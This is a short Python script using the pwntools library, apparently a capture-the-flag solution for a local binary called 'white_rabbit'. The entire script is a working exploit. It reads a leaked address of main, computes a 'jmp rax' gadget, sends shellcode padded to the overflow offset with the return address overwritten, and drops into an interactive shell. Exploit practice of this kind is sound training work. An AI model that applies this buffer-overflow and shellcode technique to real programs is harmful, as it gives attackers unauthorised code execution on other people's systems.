# rabbit.py
from pwn import *
import re

io = process('./white_rabbit')
elf = context.binary = ELF('./white_rabbit')

leak = io.recv()
main = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
shellcode = asm(shellcraft.sh())                           
jmp_rax = main - 0xc1

payload = shellcode
payload += cyclic(120-len(shellcode))
payload += p64(jmp_rax)

io.sendline(payload)
io.interactive()
io.close()
